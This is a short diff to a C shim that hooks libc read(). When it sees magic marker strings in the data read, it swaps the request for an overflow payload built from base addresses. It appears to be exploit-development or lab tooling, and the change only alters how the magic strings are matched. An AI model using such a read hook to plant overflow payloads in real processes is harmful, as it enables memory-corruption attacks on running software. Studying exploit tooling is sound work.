@@ -10,7 +10,8 @@
 #include "payload.h"
 #include "strnstr.h"
 
-static const char s_magic[]	= "xyzzx";
+static const char s_basemagic[]	= "xyzzy";
+static const char s_fullmagic[]	= "xyzzx";
 static const char s_makeload[]	= "MAKELOAD";
 static const char s_dumpload[]	= "DUMPLOAD";
 static const char s_overload[]	= "OVERLOAD";
@@ -46,9 +47,13 @@ static ssize_t falseEcho(PayloadPtr plp, char *p, ssize_t np) {
 
 	// Make room for the payload (where the request used to be).
 	char *src = p + nc;
-	char *dst = p + nPayload64 - strlen(s_makeload) + strlen(s_overflow);
+	char *dst = p + nPayload64 - strlen(s_fullmagic) + strlen(s_basemagic) - strlen(s_makeload) + strlen(s_overflow);
 	int delta = dst - src;
 	memmove(dst, src, np - nc);
+
+	// Replace s_fullmagic with s_basemagic
+	memcpy(p - strlen(s_makeload) - strlen(s_fullmagic), s_basemagic, strlen(s_basemagic));
+	p += strlen(s_basemagic) - strlen(s_fullmagic);
 
 	// Replace s_makeload with s_overflow
 	memcpy(p - strlen(s_makeload), s_overflow, strlen(s_overflow));
@@ -87,10 +92,10 @@ ssize_t read(int fd, void *buf, size_t count) {
 	Read *libc_read = (Read *) dlsym(RTLD_NEXT, "read");
 	ssize_t result = libc_read(fd, buf, count);
 
-	char *p = (result < strlen(s_magic)) ? NULL : strnstr(buf, s_magic, result);
+	char *p = (result < strlen(s_fullmagic)) ? NULL : strnstr(buf, s_fullmagic, result);
 
 	if (p) {
-		p += strlen(s_magic);
+		p += strlen(s_fullmagic);
 
 		static BaseAddresses baseAddresses;
 		static Payload payload;
